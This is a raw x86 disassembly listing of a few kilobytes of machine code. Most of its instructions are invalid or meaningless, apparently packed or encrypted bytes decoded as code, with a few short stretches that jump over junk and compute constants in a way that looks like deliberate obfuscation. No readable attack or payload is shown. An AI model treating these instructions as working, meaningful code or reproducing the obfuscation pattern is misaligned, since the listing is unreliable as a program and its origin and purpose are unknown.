  410753:	call   0xcf5f:0xc3ffff62
  41075a:	outs   dx,DWORD PTR ds:[esi]
  41075b:	push   ss
  41075c:	xchg   ebx,ebx
  41075e:	pop    ecx
  41075f:	mov    ds,WORD PTR [ebx+eax*1+0x30bc2e51]
  410766:	sahf   
  410767:	adc    bh,BYTE PTR [esi]
  410769:	fs (bad) 
  41076b:	(bad)  
  41076c:	lock jmp 0x2c6c:0x6f00bd1f
  410774:	cmp    al,0x16
  410776:	jno    0x41072b
  410778:	sar    BYTE PTR [ebx+ebp*8],cl
  41077b:	je     0x410752
  41077d:	out    dx,al
  41077e:	(bad)  
  41077f:	jl     0x410763
  410781:	pop    ebx
  410782:	push   ecx
  410783:	dec    ebx
  410784:	pop    ebp
  410785:	mov    ds:0x8108758b,al
  41078b:	fldenv [esi]
  41078d:	das    
  41078e:	add    BYTE PTR [eax],al
  410790:	mov    ecx,0x32729c
  410795:	add    eax,ecx
  410797:	jmp    0x410b61
  41079c:	outs   dx,DWORD PTR ds:[esi]
  41079d:	mov    ebp,ds
  41079f:	or     al,0xd9
  4107a1:	imul   ebp,DWORD PTR [ecx+0x6b],0x19f67ea1
  4107a8:	popa   
  4107a9:	sbb    DWORD PTR [edx-0x1],ebp
  4107ac:	mov    eax,DWORD PTR [esi+0x70]
  4107af:	jo     0x410754
  4107b1:	jge    0x410823
  4107b3:	jo     0x410790
  4107b5:	mov    cl,0x97
  4107b7:	add    DWORD PTR [edi],ecx
  4107b9:	jge    0x4107fd
  4107bb:	arpl   dx,sp
  4107bd:	cmp    BYTE PTR [eax+0x707ca248],al
  4107c3:	dec    esi
  4107c4:	or     eax,0x88e7ff30
  4107c9:	out    dx,al
  4107ca:	in     eax,0xb9
  4107cc:	or     ebx,DWORD PTR [ebx-0x50a7c8eb]
  4107d2:	sub    ah,BYTE PTR [esi+0xc62d759]
  4107d8:	fucomip st,st(7)
  4107da:	or     al,BYTE PTR [ecx+0x7121a93f]
  4107e0:	adc    eax,0x7d66d18
  4107e5:	stc    
  4107e6:	mov    eax,0x15043d7e
  4107eb:	ins    DWORD PTR es:[edi],dx
  4107ec:	je     0x4107a2
  4107ee:	add    ebp,DWORD PTR [ebp-0x17b91328]
  4107f4:	fcomp  DWORD PTR [esi-0x1fd76712]
  4107fa:	sbb    dh,al
  4107fc:	adc    esi,ebx
  4107fe:	mov    DWORD PTR [ebx+0x18c8385],edx
  410804:	mov    eax,ds:0xc3c2db17
  410809:	ds or  al,0x27
  41080c:	mov    dh,0x29
  41080e:	sub    eax,0x8cb22b2f
  410813:	(bad)  
  410815:	inc    esi
  410816:	push   ecx
  410817:	pushf  
  410818:	sbb    edx,DWORD PTR [ecx-0x3fb53e10]
  41081e:	cwde   
  41081f:	sbb    DWORD PTR [ebx],edx
  410821:	cmc    
  410822:	sbb    eax,0x9dbece65
  410827:	xchg   DWORD PTR [ebx-0x22],eax
  41082a:	inc    ecx
  41082b:	mov    cl,0x18
  41082d:	or     BYTE PTR ds:0x879b9a7,bl
  410833:	mov    cl,BYTE PTR [edx-0x4571776f]
  410839:	call   0x583e91b4
  41083e:	or     ecx,DWORD PTR [ecx-0x7610c5dd]
  410844:	repnz xor eax,0xdf45138b
  41084a:	push   es
  41084b:	cmp    eax,0x61658fd0
  410850:	mov    al,0xfd
  410852:	jmp    0x4108a5
  410854:	and    al,0x4a
  410856:	inc    ebp
  410857:	iret   
  410858:	inc    ebp
  410859:	jl     0x410836
  41085b:	ficom  DWORD PTR [ebx]
  41085d:	lods   eax,DWORD PTR ds:[esi]
  41085e:	shr    DWORD PTR [ebx+eiz*2+0x3dd792b0],1
  410865:	mov    WORD PTR [edx+eiz*1+0x769b2c02],ds
  41086c:	inc    ebp
  41086d:	(bad)  
  41086e:	adc    al,0xaf
  410870:	fcmovu st,st(6)
  410872:	push   ds
  410873:	rol    DWORD PTR [ecx],0x8f
  410876:	xor    al,0xe
  410878:	sbb    al,0xea
  41087a:	out    dx,eax
  41087b:	xor    al,0x81
  41087d:	dec    eax
  41087e:	or     al,0x7b
  410880:	enter  0x63b6,0x6b
  410884:	xchg   DWORD PTR [ecx],ebx
  410886:	js     0x4108f1
  410888:	ins    BYTE PTR es:[edi],dx
  410889:	sub    bh,bl
  41088b:	sub    al,0xf5
  41088d:	icebp  
  41088e:	(bad)  
  41088f:	nop
  410890:	or     eax,0x441a4850
  410895:	mov    ebp,0x197b1de5
  41089a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41089b:	fadd   QWORD PTR [edi]
  41089d:	sub    BYTE PTR [eax],dl
  41089f:	push   cs
  4108a0:	jno    0x410826
  4108a2:	adc    BYTE PTR ss:[esi+0x37cab5a2],al
  4108a9:	mov    ds:0xdb513cfa,eax
  4108ae:	jmp    0x4108ae
  4108b0:	jecxz  0x4108a8
  4108b2:	fdiv   st(6),st
  4108b4:	pop    edi
  4108b5:	mov    esi,0x3e85a15c
  4108ba:	nop
  4108bb:	test   DWORD PTR [esp+eiz*8-0x814dcbc],esp
  4108c2:	loop   0x4108a2
  4108c4:	sbb    DWORD PTR [esi-0x23],esi
  4108c7:	sub    edx,DWORD PTR [ecx-0x1]
  4108ca:	shr    DWORD PTR [edi-0x6d],0x90
  4108ce:	retf   0x2576
  4108d1:	ret    
  4108d2:	call   0xcaa7:0xf777fb
  4108d9:	cdq    
  4108da:	push   ss
  4108db:	adc    DWORD PTR [ebp-0x577d89f3],edx
  4108e1:	push   ecx
  4108e2:	pop    eax
  4108e3:	push   edi
  4108e4:	ins    DWORD PTR es:[edi],dx
  4108e5:	mov    edi,0xa31afa79
  4108ea:	push   edx
  4108eb:	or     al,0x6a
  4108ed:	loope  0x410943
  4108ef:	cmp    eax,0x4701e875
  4108f4:	call   0xe6a4ce2c
  4108f9:	arpl   WORD PTR [ebp-0x7c],di
  4108fc:	aad    0x21
  4108fe:	(bad)  
  4108ff:	sbb    esp,edx
  410901:	dec    ebp
  410902:	sub    BYTE PTR [ecx],cl
  410904:	outs   dx,BYTE PTR ds:[esi]
  410905:	cli    
  410906:	dec    edx
  410907:	call   0x4e0f7074
  41090c:	pop    edx
  41090d:	mov    cl,0x4c
  41090f:	cmp    DWORD PTR [esi],edi
  410911:	add    BYTE PTR [ebx-0x74546480],ch
  410917:	mov    edx,0x3656d64e
  41091c:	inc    ecx
  41091d:	mov    cs,edx
  41091f:	jno    0x4108c0
  410921:	jbe    0x410949
  410923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410924:	rol    BYTE PTR [eax],0x13
  410927:	aad    0xaf
  410929:	jmp    0xf9329503
  41092e:	ds jbe 0x410964
  410931:	ins    DWORD PTR es:[edi],dx
  410932:	repz loopne 0x410904
  410935:	xchg   esp,eax
  410936:	xor    eax,0x304ea9b2
  41093b:	xor    edx,esp
  41093d:	repz inc ecx
  41093f:	mov    eax,ds:0x49e39e6b
  410944:	nop
  410945:	mov    al,cl
  410947:	mov    dl,0xb0
  410949:	push   es
  41094a:	dec    eax
  41094b:	int3   
  41094c:	push   0xfd276f83
  410951:	xchg   ebp,eax
  410952:	std    
  410953:	push   ebx
  410954:	into   
  410955:	nop
  410956:	(bad)  
  410958:	jne    0x410945
  41095a:	fwait
  41095b:	push   ebx
  41095c:	loop   0x4109ca
  41095e:	xchg   DWORD PTR [edx],esp
  410960:	out    0xd5,eax
  410962:	mov    al,ds:0x93fb26fa
  410967:	xchg   ebx,eax
  410968:	push   0xf227063a
  41096d:	inc    edx
  41096e:	and    al,0x4b
  410970:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410971:	sbb    al,0xfe
  410973:	mov    ah,cl
  410975:	dec    esp
  410976:	adc    DWORD PTR [esi+0x3d],esi
  410979:	mov    DWORD PTR [eax-0x26],edx
  41097c:	xchg   dl,ch
  41097e:	sbb    dh,BYTE PTR [edx-0x413afad6]
  410984:	or     DWORD PTR [ecx+eax*8+0x17db5cf8],esi
  41098b:	test   al,0x9a
  41098d:	daa    
  41098e:	sub    al,0x29
  410990:	xchg   ebp,eax
  410991:	scas   al,BYTE PTR es:[edi]
  410992:	in     eax,dx
  410993:	retf   0x991b
  410996:	popf   
  410997:	xchg   ecx,eax
  410998:	div    BYTE PTR [ebp-0xe9fd621]
  41099e:	sub    BYTE PTR [ebx+0x3c9461fa],dh
  4109a4:	hlt    
  4109a5:	xchg   edi,eax
  4109a6:	out    0xec,eax
  4109a8:	out    dx,al
  4109a9:	ret    
  4109aa:	dec    ebx
  4109ab:	aam    0xfe
  4109ad:	fcmovb st,st(2)
  4109af:	sub    eax,0xe8ae4914
  4109b4:	fist   DWORD PTR [edx]
  4109b6:	dec    ebx
  4109b7:	cdq    
  4109b8:	mov    esi,DWORD PTR [esi+esi*2]
  4109bb:	add    eax,0xd325676b
  4109c0:	mov    al,0x4b
  4109c2:	dec    ecx
  4109c3:	push   esp
  4109c4:	sti    
  4109c5:	scas   eax,DWORD PTR es:[edi]
  4109c6:	aam    0x55
  4109c8:	push   edi
  4109c9:	dec    esi
  4109ca:	jge    0x410a48
  4109cc:	cmp    eax,0x4922ccb6
  4109d1:	cli    
  4109d2:	scas   al,BYTE PTR es:[edi]
  4109d3:	sub    ebp,DWORD PTR [ebx-0x7e79cba2]
  4109d9:	ds daa 
  4109db:	pop    ds
  4109dc:	mov    esi,0x6ae07efd
  4109e1:	pop    es
  4109e2:	adc    DWORD PTR [eax],esp
  4109e4:	mov    edx,0xe9a5f5b4
  4109e9:	ds adc eax,0xf953b580
  4109ef:	daa    
  4109f0:	stos   BYTE PTR es:[edi],al
  4109f1:	div    DWORD PTR [edi]
  4109f3:	out    dx,al
  4109f4:	scas   al,BYTE PTR es:[edi]
  4109f5:	mov    ah,0x8d
  4109f7:	not    DWORD PTR [esi-0x45]
  4109fa:	imul   ecx,esp,0xf2d8bd0c
  410a00:	jne    0x4109d1
  410a02:	xchg   dl,cl
  410a04:	lods   eax,DWORD PTR ds:[esi]
  410a05:	mov    al,0x29
  410a07:	aas    
  410a08:	push   edi
  410a09:	pop    ecx
  410a0a:	test   DWORD PTR [edi],esp
  410a0c:	aam    0x8a
  410a0e:	(bad)  
  410a0f:	imul   ebp
  410a11:	fistp  WORD PTR [ebp+0x34]
  410a14:	pusha  
  410a15:	dec    esi
  410a16:	sbb    eax,0xecd76f5
  410a1b:	push   edi
  410a1c:	imul   esi,ecx,0x763fcc50
  410a22:	std    
  410a23:	(bad)  
  410a24:	fs add bl,cl
  410a27:	ins    BYTE PTR es:[edi],dx
  410a28:	enter  0xdd83,0xab
  410a2c:	cmp    bh,bh
  410a2e:	pop    ds
  410a2f:	cmp    eax,0x60632255
  410a34:	and    eax,0xdc1f77ee
  410a39:	or     BYTE PTR [ebx],al
  410a3b:	loope  0x410ab0
  410a3d:	shl    BYTE PTR [edx+0x355f6e68],0x8e
  410a44:	(bad)  
  410a45:	jae    0x410a2d
  410a47:	into   
  410a48:	jmp    0x410abb
  410a4a:	push   ebp
  410a4b:	adc    BYTE PTR [esi+0x58089b17],ah
  410a51:	test   eax,0xedbec71
  410a56:	inc    eax
  410a57:	cmp    al,0xbe
  410a59:	cld    
  410a5a:	not    BYTE PTR [esi+0x307e86f8]
  410a60:	mov    cl,0xd5
  410a62:	mov    al,ds:0x67814418
  410a67:	and    esp,eax
  410a69:	pusha  
  410a6a:	or     edi,DWORD PTR [ebx]
  410a6c:	shl    BYTE PTR [esi-0x2d77b5d],cl
  410a72:	push   ebp
  410a73:	addr16 cmp ebx,esi
  410a76:	adc    BYTE PTR [ecx],ah
  410a78:	inc    edi
  410a7a:	mov    BYTE PTR [ebx+0x678d811b],al
  410a80:	pop    ebp
  410a81:	gs mov DWORD PTR ss:[eax+0x54],esi
  410a86:	outs   dx,BYTE PTR ds:[esi]
  410a87:	or     eax,0x2dd010ce
  410a8c:	mov    edi,0x9dbb31de
  410a91:	mov    ecx,0x9a84ef84
  410a96:	cld    
  410a97:	(bad)  [eax+0x5c]
  410a9a:	push   0xffffff9e
  410a9c:	or     edx,DWORD PTR [edx]
  410a9e:	popa   
  410a9f:	fistp  QWORD PTR [eax-0x77]
  410aa2:	inc    edi
  410aa3:	pop    esp
  410aa4:	retw   0xb2e9
  410aa8:	outs   dx,DWORD PTR ds:[esi]
  410aa9:	pop    edi
  410aaa:	pop    ss
  410aab:	sub    BYTE PTR [edx-0x5cb40b8e],0x81
  410ab2:	mov    dh,0x1c
  410ab4:	fistp  DWORD PTR [ecx]
  410ab6:	sub    DWORD PTR [ebp+0x4d],ebp
  410ab9:	add    DWORD PTR [edx+edi*2],ebx
  410abc:	shl    DWORD PTR [ecx+ebp*4+0x40],cl
  410ac0:	cld    
  410ac1:	xchg   DWORD PTR [esi],esp
  410ac3:	pushf  
  410ac4:	and    eax,0x49148d02
  410ac9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410acb:	mov    edi,0x4c891d64
  410ad0:	xor    ebp,DWORD PTR [ecx-0x4e]
  410ad3:	xchg   ecx,eax
  410ad4:	xchg   ebx,eax
  410ad5:	adc    edi,DWORD PTR [ebx-0x56aae443]
  410adb:	in     eax,0x32
  410add:	stos   BYTE PTR es:[edi],al
  410ade:	add    al,0x2b
  410ae0:	aaa    
  410ae1:	mov    dh,0x25
  410ae3:	mov    edx,0x409a9b91
  410ae8:	int    0xa9
  410aea:	mov    dl,0x65
  410aec:	xchg   ecx,eax
  410aed:	push   ebp
  410aee:	dec    esp
  410aef:	pop    esp
  410af0:	scas   al,BYTE PTR es:[edi]
  410af1:	jne    0x410ab3
  410af3:	lea    esi,[edx]
  410af5:	ja     0x410aac
  410af7:	cld    
  410af8:	dec    ecx
  410af9:	push   cs
  410afa:	sub    DWORD PTR [ecx+0x36e813d8],edx
  410b00:	pusha  
  410b01:	and    esp,DWORD PTR [eax+0x57]
  410b04:	add    eax,0x317753aa
  410b09:	(bad)  
  410b0b:	lahf   
  410b0c:	sahf   
  410b0d:	push   ds
  410b0e:	xchg   esi,eax
  410b0f:	test   DWORD PTR [edx+0x5e],edx
  410b12:	shl    BYTE PTR [ebp+0x57],cl
  410b15:	rcl    DWORD PTR [edx-0x37],cl
  410b18:	and    BYTE PTR [edi],dl
  410b1a:	mov    BYTE PTR [ebx+0x1b],bh
  410b1d:	xchg   esi,eax
  410b1e:	stc    
  410b1f:	adc    esi,DWORD PTR [edx+0xac3b783]
  410b25:	mov    ds:0x38bc1da8,eax
  410b2a:	cmp    ebx,ecx
  410b2c:	cmp    bl,BYTE PTR [eax]
  410b2e:	or     edi,ebp
  410b30:	hlt    
  410b31:	or     edx,DWORD PTR [esi+0x6b]
  410b34:	int3   
  410b35:	push   ds
  410b36:	jl     0x410b46
  410b38:	aam    0x78
  410b3a:	mov    eax,0x54315aba
  410b3f:	mov    eax,ds:0xadaa694
  410b44:	fadd   QWORD PTR [ebp+ecx*8+0x217bde02]
  410b4b:	sub    al,0x60
  410b4d:	adc    al,BYTE PTR [edx-0x34]
  410b50:	add    ebx,DWORD PTR [edi-0x292e136e]
  410b56:	or     eax,0x7bf6a7ea
  410b5b:	fdiv   DWORD PTR [ecx-0x76aab516]
  410b61:	cmp    DWORD PTR [esi+0x54],eax
  410b64:	pop    esi
  410b65:	je     0x410b73
  410b6b:	mov    eax,DWORD PTR [ebp+0x8]
  410b6e:	jmp    0x410b8c
  410b73:	mov    eax,DWORD PTR [ebp-0x4]
  410b76:	xor    eax,edx
  410b78:	add    eax,ecx
  410b7a:	jmp    0x410b8c
  410b7f:	mov    eax,DWORD PTR [ebp-0x4]
  410b82:	xor    eax,0x7510855
  410b87:	add    eax,0x32729c
  410b8c:	leave  
  410b8d:	ret    0x4
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	jmp    0x410f98
  410b98:	outs   dx,DWORD PTR ds:[esi]
  410b99:	mov    WORD PTR ds:0x7191e994,cs
  410b9f:	jae    0x410bc2
  410ba1:	dec    esi
  410ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba3:	repz xlat BYTE PTR ds:[ebx]
  410ba5:	xchg   edi,eax
  410ba6:	stos   DWORD PTR es:[edi],eax
  410ba7:	and    eax,0x7070423e
  410bac:	pop    eax
  410bad:	jge    0x410c1f
  410baf:	jo     0x410bbe
  410bb1:	sbb    ah,bl
  410bb3:	test   DWORD PTR [ebx+0x271f075c],esi
  410bb9:	inc    edx
  410bba:	pop    eax
  410bbb:	loope  0x410b9b
  410bbd:	sahf   
  410bbe:	inc    esp
  410bbf:	cmp    al,cl
  410bc1:	pop    ecx
  410bc2:	outs   dx,BYTE PTR ds:[esi]
  410bc3:	gs inc ebx
  410bc5:	nop
  410bc6:	vpcmpeqd ymm0,ymm5,YMMWORD PTR [esi+eiz*8-0x6ec86824]
  410bcf:	cli    
  410bd0:	daa    
  410bd1:	add    edi,edx
  410bd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bd4:	pop    esi
  410bd5:	pop    ebx
  410bd6:	sub    ah,0xf4
  410bd9:	add    edi,ebp
  410bdb:	add    ah,BYTE PTR [ecx-0x2970c6af]
  410be1:	add    al,0xf
  410be3:	pop    eax
  410be4:	inc    bp
  410be6:	hlt    
  410be7:	inc    esp
  410be8:	gs dec ebx
  410bea:	test   eax,0xdd8ba3e1
  410bef:	push   ebx
  410bf0:	pop    ecx
  410bf1:	fdivr  QWORD PTR [esi+0x76135fc5]
  410bf7:	xchg   ebx,eax
  410bf8:	cmc    
  410bf9:	push   ebp
  410bfa:	fs shl al,1
  410bfd:	mov    bl,0x1f
  410bff:	iret   
  410c00:	push   esi
  410c01:	je     0x410c61
  410c03:	sahf   
  410c04:	inc    edi
  410c05:	test   DWORD PTR [edi-0x4a1169d3],edx
  410c0b:	sar    DWORD PTR [ebx-0xb57dcca],0x23
  410c12:	sbb    al,0xcc
  410c14:	call   0x7100:0x7d64980b
  410c1b:	aad    0x6e
  410c1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c1e:	cmc    
  410c1f:	inc    ebp
  410c20:	fstp   QWORD PTR [ebp-0x46435154]
  410c26:	les    esp,FWORD PTR [edi+esi*2]
  410c29:	test   eax,0x28850595
  410c2e:	js     0x410bf9
  410c30:	and    ebx,ebx
  410c32:	add    ah,BYTE PTR [eax-0x30]
  410c35:	and    eax,0x155bd7c0
  410c3a:	push   ebp
  410c3b:	hlt    
  410c3c:	mov    cl,0x1b
  410c3e:	ins    BYTE PTR es:[edi],dx
  410c3f:	sub    esp,0x34
  410c42:	imul   edx,DWORD PTR [edx],0x4c
  410c45:	mov    edx,0xadf221b6
  410c4a:	enter  0x94,0x6b
  410c4e:	dec    esi
  410c4f:	std    
  410c50:	cli    
  410c51:	iret   
  410c52:	and    DWORD PTR [edi+eiz*8+0x72c8dec3],0x7a
  410c5a:	popa   
  410c5b:	popf   
  410c5c:	sahf   
  410c5d:	mov    cs,WORD PTR [edx+esi*8+0x66]
  410c61:	loop   0x410c88
  410c63:	nop
  410c64:	pop    eax
  410c65:	xlat   BYTE PTR ds:[ebx]
  410c66:	sub    edx,DWORD PTR [edi]
  410c68:	neg    ch
  410c6a:	jmp    0xa26b539c
  410c6f:	jg     0x410c45
  410c71:	mov    esi,0xf928ad65
  410c76:	jmp    0x191d253b
  410c7b:	pop    esp
  410c7c:	dec    edi
  410c7d:	xor    eax,0x49e3219c
  410c82:	xor    al,0x75
  410c84:	jne    0x410ccc
  410c86:	lods   eax,DWORD PTR ds:[esi]
  410c87:	xor    al,BYTE PTR [edi]
  410c89:	imul   edi,DWORD PTR [ebx+0x66f22556],0x4f
  410c90:	sub    ah,BYTE PTR ds:0x6f4a301d
  410c96:	pop    eax
  410c97:	push   edx
  410c98:	cwde   
  410c99:	test   DWORD PTR [ebp-0xf],edx
  410c9c:	int    0x21
  410c9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c9f:	out    dx,eax
  410ca0:	jnp    0x410d0c
  410ca2:	cmp    al,0xb
  410ca4:	rol    BYTE PTR [edi],0x7e
  410ca7:	(bad)  
  410ca8:	gs xchg esi,eax
  410caa:	(bad)  
  410cab:	int    0xc9
  410cad:	mov    ebp,0x505a993f
  410cb2:	xor    BYTE PTR [ebx-0x7b],al
  410cb5:	mov    BYTE PTR [esi-0x32],bh
  410cb8:	(bad)  
  410cb9:	push   0x314a2d68
  410cbe:	jmp    0x29abc375
  410cc3:	shl    BYTE PTR [eax],0xa8
  410cc6:	mov    DWORD PTR [eax+0x134f459e],edx
  410ccc:	jbe    0x410cce
  410cce:	ficom  WORD PTR [ebx]
  410cd0:	lahf   
  410cd1:	loopne 0x410c87
  410cd3:	pop    edx
  410cd4:	mov    ds:0xeb0896d6,al
  410cd9:	dec    ecx
  410cda:	mov    ecx,0x5f6291ac
  410cdf:	dec    ebx
  410ce0:	addr16 das 
  410ce2:	test   BYTE PTR [edx+0x6e856285],bl
  410ce8:	push   cs
  410ce9:	jns    0x410cbb
  410ceb:	iret   
  410cec:	aad    0x4c
  410cee:	and    BYTE PTR [ebx-0x56be395b],dh
  410cf4:	iret   
  410cf5:	fcmovnu st,st(7)
  410cf7:	and    ah,al
  410cf9:	jns    0x410cfa
  410cfb:	dec    eax
  410cfc:	and    dh,BYTE PTR [esi+ebx*1]
  410cff:	jno    0x410c86
  410d01:	es loopne 0x410cd5
  410d04:	cmp    bl,BYTE PTR [eax-0x24]
  410d07:	fmul   QWORD PTR [edi+0x5ced4996]
  410d0d:	pop    eax
  410d0e:	push   esi
  410d0f:	dec    esp
  410d10:	leave  
  410d11:	push   ss
  410d12:	add    esp,DWORD PTR [eax]
  410d14:	mov    ebp,0x5866c1e7
  410d19:	inc    ecx
  410d1a:	jg     0x410d8d
  410d1c:	xchg   esi,eax
  410d1d:	icebp  
  410d1e:	aad    0x3e
  410d20:	rcl    DWORD PTR [esi],0x40
  410d23:	cmp    DWORD PTR [eax-0x7bc06a15],esp
  410d29:	shl    BYTE PTR [esi-0x23],cl
  410d2c:	inc    edx
  410d2d:	adc    bl,BYTE PTR [edx-0x698e39e7]
  410d33:	sub    al,0x6c
  410d35:	mov    dh,bh
  410d37:	mov    gs,WORD PTR [esi-0x4647381a]
  410d3d:	xchg   esi,eax
  410d3e:	das    
  410d3f:	inc    esi
  410d40:	cmp    edx,DWORD PTR [edx+edi*2]
  410d43:	mov    al,ds:0xb38cc7b4
  410d48:	das    
  410d49:	xor    DWORD PTR [edx-0x5d],ebx
  410d4c:	repnz lds esi,FWORD PTR [ecx-0x26dff629]
  410d53:	sti    
  410d54:	fld    TBYTE PTR [esi+0x59]
  410d57:	sbb    ch,BYTE PTR [ebp+0x7b272d54]
  410d5d:	mov    cl,0x8a
  410d5f:	(bad)  
  410d60:	jmp    0x410da2
  410d62:	jl     0x410d66
  410d64:	sar    BYTE PTR [esi+eiz*2+0x4],cl
  410d68:	pusha  
  410d69:	dec    edx
  410d6a:	bound  eax,QWORD PTR [edi]
  410d6c:	xor    DWORD PTR [eax-0x550b124d],ecx
  410d72:	dec    edx
  410d73:	mov    ah,0x46
  410d75:	cli    
  410d76:	xchg   esp,eax
  410d77:	xchg   ecx,eax
  410d78:	dec    edi
  410d79:	inc    esp
  410d7a:	mov    bh,0x70
  410d7c:	in     eax,0xaa
  410d7e:	mov    cl,0xeb
  410d80:	mov    al,0x21
  410d82:	ds push ds
  410d84:	mov    ch,0xbd
  410d86:	bound  esp,QWORD PTR [edi-0x10c29b9b]
  410d8c:	mov    edx,0x71963dd9
  410d91:	hlt    
  410d92:	mov    bl,0xc3
  410d94:	loop   0x410d8e
  410d96:	inc    ecx
  410d97:	sahf   
  410d98:	mov    DWORD PTR [eax],0x2b34de7b
  410d9e:	jno    0x410d79
  410da0:	xchg   ebp,eax
  410da1:	mov    ch,0x44
  410da3:	daa    
  410da4:	mov    ebp,0x97aab5b2
  410da9:	cli    
  410daa:	sbb    bh,BYTE PTR [edx+0xa5d80b8]
  410db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410db1:	push   ebx
  410db2:	fsubr  st(7),st
  410db4:	jl     0x410d43
  410db6:	into   
  410db7:	xchg   DWORD PTR [esi-0x428c2212],esp
  410dbd:	jno    0x410e25
  410dbf:	addr16 out 0x52,eax
  410dc2:	lods   al,BYTE PTR ds:[esi]
  410dc3:	mov    eax,0xa4bfeae5
  410dc8:	xchg   ebp,eax
  410dc9:	aaa    
  410dca:	outs   dx,DWORD PTR ds:[esi]
  410dcb:	test   al,0xc5
  410dcd:	dec    ecx
  410dce:	cli    
  410dcf:	ret    
  410dd0:	or     ebx,DWORD PTR [ebp+0x60]
  410dd3:	xchg   edx,eax
  410dd4:	mov    esp,edi
  410dd6:	mov    esp,0x10f8226a
  410ddb:	jmp    0x410d68
  410ddd:	push   ecx
  410dde:	mov    cl,0x28
  410de0:	fidiv  WORD PTR [eax+0x584155bf]
  410de6:	jl     0x410ddf
  410de8:	inc    ebx
  410de9:	mov    BYTE PTR [esi-0x74cfae46],0xf4
  410df0:	call   0xd513:0xcdbe486c
  410df7:	cmp    BYTE PTR [edi+0x470a79ef],dl
  410dfd:	pop    es
  410dfe:	out    0x46,al
  410e00:	xor    al,0x93
  410e02:	push   ebx
  410e03:	loope  0x410e32
  410e05:	dec    ecx
  410e06:	push   ss
  410e07:	inc    eax
  410e08:	dec    ecx
  410e09:	rol    dl,cl
  410e0b:	inc    esp
  410e0c:	and    eax,0x61d226ed
  410e11:	cmp    al,0x0
  410e13:	jns    0x410de9
  410e15:	arpl   WORD PTR [esi+ecx*1-0x379f7263],di
  410e1c:	jae    0x410dbe
  410e1e:	lods   eax,DWORD PTR ds:[esi]
  410e1f:	call   0x9100bc0d
  410e24:	pop    DWORD PTR [eax+0x16]
  410e27:	add    DWORD PTR [esi],esi
  410e29:	cs aaa 
  410e2b:	mov    ecx,DWORD PTR [edx+0x7a]
  410e2e:	dec    esi
  410e2f:	dec    ebx
  410e30:	cmp    al,0x9b
  410e32:	jg     0x410e4d
  410e34:	dec    esi
  410e35:	mov    cl,0x68
  410e37:	in     eax,0x71
  410e39:	out    0xfc,eax
  410e3b:	sub    esi,eax
  410e3d:	fidivr DWORD PTR gs:[eax-0x2902590c]
  410e44:	push   esp
  410e45:	mov    ds:0x3bdebb66,al
  410e4a:	add    BYTE PTR [esi+0x45],dh
  410e4d:	dec    edi
  410e4e:	inc    ebx
  410e4f:	dec    ebx
  410e50:	pusha  
  410e51:	call   0xae6bfe5f
  410e56:	xchg   BYTE PTR [esi-0x3919f73],bl
  410e5c:	(bad)  
  410e5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e5e:	inc    eax
  410e5f:	jne    0x410ea9
  410e61:	pop    esi
  410e62:	mov    ds:0x6037e890,eax
  410e67:	call   0xaad85401
  410e6c:	jb     0x410e2a
  410e6e:	xlat   BYTE PTR ds:[ebx]
  410e6f:	push   cs
  410e70:	mov    al,0x5c
  410e72:	dec    ebx
  410e73:	jns    0x410e49
  410e75:	adc    dl,dh
  410e77:	cmp    BYTE PTR [eax-0x39fa235],cl
  410e7d:	mov    esp,0xc8d9cd15
  410e82:	and    eax,0x9c82bc28
  410e87:	push   eax
  410e88:	dec    bx
  410e8a:	mov    cl,ch
  410e8c:	jecxz  0x410edf
  410e8e:	adc    DWORD PTR [ebp-0x6b],esi
  410e91:	push   cs
  410e92:	bound  edi,QWORD PTR [edx-0x18785b57]
  410e98:	retf   0x7cc0
  410e9b:	jge    0x410ee9
  410e9d:	test   eax,0x2ae8b11a
  410ea3:	scas   eax,DWORD PTR es:[edi]
  410ea4:	jbe    0x410e40
  410ea6:	aad    0xb7
  410ea8:	clc    
  410ea9:	data16 loop 0x410e62
  410eac:	xchg   ebx,eax
  410ead:	push   edx
  410eae:	mov    eax,0x9bfc7f36
  410eb3:	jle    0x410e68
  410eb5:	fsub   QWORD PTR [ebp+0x5adc7480]
  410ebb:	sub    DWORD PTR [ebx-0x2a],0x702d8c8a
  410ec2:	out    dx,al
  410ec3:	cmp    BYTE PTR ds:0xae1970ee,dl
  410ec9:	arpl   WORD PTR es:[esi-0x21929df2],di
  410ed0:	pop    esp
  410ed1:	(bad)  
  410ed2:	mov    ah,0xb6
  410ed4:	into   
  410ed5:	cmp    cl,BYTE PTR ds:[edi-0x3853f2f6]
  410edc:	inc    edx
  410edd:	inc    ebx
  410ede:	xchg   esi,eax
  410edf:	cmp    ecx,DWORD PTR cs:[edi+edi*8-0x3d517d95]
  410ee7:	push   esp
  410ee8:	call   0x6d7e:0xbf255f72
  410eef:	xchg   esp,eax
  410ef0:	inc    ebx
  410ef1:	stos   BYTE PTR es:[edi],al
  410ef2:	add    edi,DWORD PTR [ecx+0x67185d08]
  410ef8:	xchg   edx,eax
  410ef9:	rol    BYTE PTR [ebp-0x6c],1
  410efc:	inc    eax
  410efd:	loopne 0x410ea5
  410eff:	inc    ebp
  410f00:	outs   dx,BYTE PTR ds:[esi]
  410f01:	out    0xa9,eax
  410f03:	mov    BYTE PTR [esi+eax*1],ch
  410f06:	lods   ax,WORD PTR ds:[esi]
  410f08:	xchg   DWORD PTR [ecx],esp
  410f0a:	cmp    eax,0x7dbebe21
  410f0f:	mov    edx,0xe6988c54
  410f14:	sbb    dh,BYTE PTR [edi-0x13]
  410f17:	fist   DWORD PTR es:[edi+0x5fde7d1b]
  410f1e:	dec    esi
  410f1f:	push   ebp
  410f20:	mov    ds:0xf6366026,al
  410f25:	pop    eax
  410f26:	inc    eax
  410f27:	or     al,0x46
  410f29:	fsub   DWORD PTR [esi+0x26]
  410f2c:	pop    eax
  410f2d:	div    esp
  410f2f:	jbe    0x410f51
  410f31:	pop    edx
  410f32:	and    esp,DWORD PTR [esi]
  410f34:	mov    dh,0x32
  410f36:	ja     0x410fac
